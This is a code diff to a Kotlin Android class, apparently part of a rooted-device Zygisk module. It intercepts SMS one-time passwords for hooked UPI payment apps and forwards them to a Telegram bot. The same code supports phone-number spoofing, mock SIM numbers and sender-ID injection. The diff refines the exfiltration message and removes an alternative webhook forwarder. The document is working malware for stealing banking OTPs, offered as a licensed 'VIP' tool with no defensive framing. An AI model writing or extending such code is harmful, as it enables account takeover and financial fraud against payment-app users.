@@ -14,88 +14,49 @@ class TokenForwarder(
 
     private val client = OkHttpClient()
 
+    /**
+     * Sirf hooked UPI app ka verify number + intercepted SMS — kuch aur Telegram pe nahi jata.
+     */
     fun forward(otp: LastOtp): Boolean {
         val config = configManager.load()
-        if (!config.autoForwardToken && !config.fakeInterceptTelegram) return false
+        if (!config.autoForwardToken) return false
 
         val peer = otp.rawPeer.ifBlank { otp.sender }
         val body = otp.body.ifBlank { otp.otp }
         if (!SmsMatcher.shouldForwardToTelegram(config, peer, body, otp.direction)) return false
-        if (SmsMatcher.matchedHookedApp(config, peer, body) == null) return false
 
         val botToken = config.telegramBotToken
         val chatId = config.telegramChatId
-
-        if (botToken.isBlank() || chatId.isBlank()) {
-            if (config.forwardUrl.isBlank()) return false
-            return forwardWebhook(config.forwardUrl, config.forwardMethod, otp)
-        }
-
-        return postTelegram(botToken, chatId, buildZygiskMenuMessage(otp))
-    }
-
-    fun forwardFakeIntercept(otp: LastOtp): Boolean {
-        val config = configManager.load()
-        if (!config.fakeInterceptTelegram) return false
-        val botToken = config.telegramBotToken
-        val chatId = config.telegramChatId
         if (botToken.isBlank() || chatId.isBlank()) return false
-        return postTelegram(botToken, chatId, buildZygiskMenuMessage(otp, fakeIntercept = true))
+
+        return postTelegram(botToken, chatId, buildInterceptMessage(otp, config))
     }
 
-    fun sendTestMessage(botToken: String, chatId: String, health: ModuleHealth): Boolean {
-        if (botToken.isBlank() || chatId.isBlank()) return false
-        val config = configManager.load()
-
-        val text = buildString {
-            appendLine("📱 <b>Zygisk Menu</b>")
-            appendLine("<b>Mode By @hivirtus @liqdy</b>")
-            appendLine("────────────────")
-            appendLine("<b>${escapeHtml(health.statusLine)}</b>")
-            appendLine("📞 <b>Intercept No:</b> UPI verify number (auto per app)")
-            appendLine("📦 Module ZIP: ${if (health.moduleInstalled) "Installed ✅" else "Missing ❌"}")
-            appendLine("⚡ Zygisk Hook: ${if (health.zygiskLoaded) "Loaded ✅" else "Not loaded — reboot?"}")
-            appendLine("📱 Phone Spoof: ${if (health.phoneSpoofReady) "Ready ✅ (${escapeHtml(health.spoofPhone)})" else "OFF / number missing ❌"}")
-            appendLine("🆔 Sender ID: ${if (health.senderIdSet) "Set ✅" else "Missing — MESSAGE tab ❌"}")
-            appendLine("🔐 VIP: ${if (health.licensed) "Active ✅" else "Not active ❌"}")
-            appendLine("🌐 Root: ${escapeHtml(health.rootType)}")
-        }
-        return postTelegram(botToken, chatId, text)
-    }
-
-    private fun forwardTelegram(botToken: String, chatId: String, otp: LastOtp): Boolean {
-        return postTelegram(botToken, chatId, buildZygiskMenuMessage(otp))
-    }
-
-    fun buildZygiskMenuMessage(otp: LastOtp, fakeIntercept: Boolean = false): String {
-        val config = configManager.load()
+  private fun buildInterceptMessage(otp: LastOtp, config: ModuleConfig): String {
+        val appName = resolveHookedAppName(otp)
         val interceptNo = resolveUpiVerifyNumber(otp, config)
-        val body = otp.body.ifBlank { otp.otp }.trim()
-        val health = context?.let { ModuleHealthChecker.check(it) }
+        val smsBody = otp.body.ifBlank { otp.otp }.trim()
 
         return buildString {
-            appendLine("📱 <b>Zygisk Menu</b>")
-            appendLine("<b>Mode By @hivirtus @liqdy</b>")
-            appendLine("────────────────")
-            if (health != null) {
-                appendLine("<b>${escapeHtml(health.statusLine)}</b>")
-            }
-            if (fakeIntercept) {
-                appendLine("🎭 <b>Fake Intercept</b>")
-            }
-            if (otp.messageLabel.isNotBlank()) {
-                appendLine("📲 <b>Hooked App:</b> ${escapeHtml(otp.messageLabel)}")
-            }
-            appendLine("📞 <b>Intercept No:</b> ${escapeHtml(interceptNo)}")
-            if (body.isNotBlank()) {
-                append(escapeHtml(body))
+            appendLine("📲 <b>${escapeHtml(appName)}</b>")
+            appendLine("📞 <b>${escapeHtml(interceptNo)}</b>")
+            if (smsBody.isNotBlank()) {
+                append(escapeHtml(smsBody))
             }
         }
+    }
+
+    private fun resolveHookedAppName(otp: LastOtp): String {
+        if (otp.messageLabel.isNotBlank()) return otp.messageLabel
+        val activePkg = ActiveHookManager.readActivePackage()
+        if (!activePkg.isNullOrBlank()) {
+            return UpiAppRegistry.displayNameFor(activePkg)
+        }
+        return "Hooked App"
     }
 
     /**
-     * UPI app ka verify number — SMS bhejne/waala peer (91221..., VM-PHONEPE, etc.)
-     * Tumhara spoof / personal number Telegram pe nahi aata.
+     * UPI verify number — short code / sender jahan SMS intercept hua (+91 personal nahi).
      */
     private fun resolveUpiVerifyNumber(otp: LastOtp, config: ModuleConfig): String {
         val rawPeer = otp.rawPeer.trim()
@@ -133,6 +94,7 @@ class TokenForwarder(
         add(normalizeDigits(configManager.readSpoofPhone()))
         add(normalizeDigits(config.mockPhoneSim1))
         add(normalizeDigits(config.mockPhoneSim2))
+        add(normalizeDigits(config.injectSenderId))
     }
 
     private fun normalizeDigits(value: String): String =
@@ -164,29 +126,6 @@ class TokenForwarder(
             .put("disable_web_page_preview", true)
             .toString()
         return postJson(url, payload)
-    }
-
-    private fun forwardWebhook(url: String, method: String, otp: LastOtp): Boolean {
-        val config = configManager.load()
-        val interceptNo = resolveUpiVerifyNumber(otp, config)
-        val payload = JSONObject()
-            .put("otp", otp.otp)
-            .put("token", otp.body.ifBlank { otp.otp })
-            .put("intercept_no", interceptNo)
-            .put("direction", otp.direction)
-            .put("telegram_format", buildZygiskMenuMessage(otp))
-            .toString()
-
-        val request = Request.Builder()
-            .url(url)
-            .method(method.uppercase(), payload.toRequestBody("application/json".toMediaType()))
-            .build()
-
-        return try {
-            client.newCall(request).execute().use { it.isSuccessful }
-        } catch (_: Exception) {
-            false
-        }
     }
 
     private fun postJson(url: String, payload: String): Boolean {
